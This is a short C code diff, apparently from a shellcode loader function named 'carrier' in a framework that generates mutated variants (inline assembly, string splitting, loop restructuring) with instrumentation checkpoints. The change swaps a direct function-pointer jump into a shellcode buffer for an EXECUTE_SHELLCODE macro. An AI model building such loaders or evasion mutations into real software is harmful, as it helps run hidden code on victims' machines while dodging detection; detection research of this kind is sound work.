@@ -4,6 +4,7 @@
  * MUTATIONS: inline_assembly, string_splitting, loop_restructuring
  */
 #include "../header/definitions.h"
+#include "sc_checkpoint.h"
 
 // ====================================================================
 // PEB STRUCTURES
@@ -180,11 +181,7 @@ int carrier() {
 
     // @MUTATE:execution_method(direct|callback|fiber|threadpool)
     ARTIFACT_CHECKPOINT("Launching");
-#ifdef ENABLE_INSTRUMENTATION
-    ((void(*)(void(*)(const char*)))(dest))(__artifact_checkpoint);
-#else
-    (*(void(*)())(dest))();
-#endif
+    EXECUTE_SHELLCODE(dest);
 
     return 0;
 }
